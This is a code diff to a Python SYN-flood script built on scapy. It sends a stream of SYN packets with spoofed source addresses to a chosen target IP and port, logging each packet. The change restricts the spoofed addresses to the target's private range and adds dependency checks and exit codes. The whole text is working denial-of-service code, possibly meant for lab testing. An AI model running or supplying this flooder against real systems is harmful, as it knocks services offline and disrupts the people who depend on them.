@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-from scapy.all import *
 import argparse
 import time
 import random
 import os
+import sys
 
 def is_private_ip(ip):
     try:
@@ -19,6 +19,16 @@ def is_private_ip(ip):
     except:
         pass
     return False
+
+def random_private_source_ip(target_ip):
+    parts = list(map(int, target_ip.split(".")))
+    if parts[0] == 127:
+        return f"127.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"
+    if parts[0] == 10:
+        return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+    if parts[0] == 172:
+        return f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
+    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
 
 def main():
     parser = argparse.ArgumentParser(description="SYN Flood")
@@ -37,13 +47,19 @@ def main():
     if log_dir:
         os.makedirs(log_dir, exist_ok=True)
 
+    try:
+        from scapy.all import IP, TCP, send
+    except ImportError:
+        print("[ERROR] Missing dependency: scapy. Install it with: python3 -m pip install scapy", file=sys.stderr)
+        return 1
+
     start_time = time.time()
     with open(args.output, "w") as f:
         f.write("timestamp,src_ip,dst_ip,dst_port,action\n")
 
     while time.time() - start_time < args.duration:
         try:
-            src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+            src_ip = random_private_source_ip(args.target_ip)
             ip = IP(src=src_ip, dst=args.target_ip)
             tcp = TCP(sport=random.randint(1024,65535), dport=args.target_port, flags="S")
             send(ip/tcp, verbose=0)
@@ -56,6 +72,7 @@ def main():
         except Exception as e:
             with open(args.output, "a") as f:
                 f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')},ERROR,ERROR,ERROR,{str(e)}\n")
+    return 0
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
